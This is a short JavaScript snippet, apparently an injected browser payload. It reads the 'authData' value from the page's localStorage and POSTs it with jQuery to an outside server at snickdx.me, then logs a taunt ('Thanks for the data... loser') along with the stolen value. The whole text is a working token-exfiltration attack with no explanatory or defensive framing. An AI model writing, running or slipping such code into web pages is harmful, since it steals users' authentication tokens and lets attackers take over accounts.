$.ajax({
	"async": true,
	"crossDomain": true,
	"url": "https://snickdx.me:3002/tokens",
	"method": "POST",
	"headers": {
		"content-type": "application/json",
		"cache-control": "no-cache"
	},
	"processData": false,
	"data": window.localStorage.getItem('authData')
}).done(function(){
	console.log("Thanks for the data... loser");
	console.log(window.localStorage.getItem('authData'));
});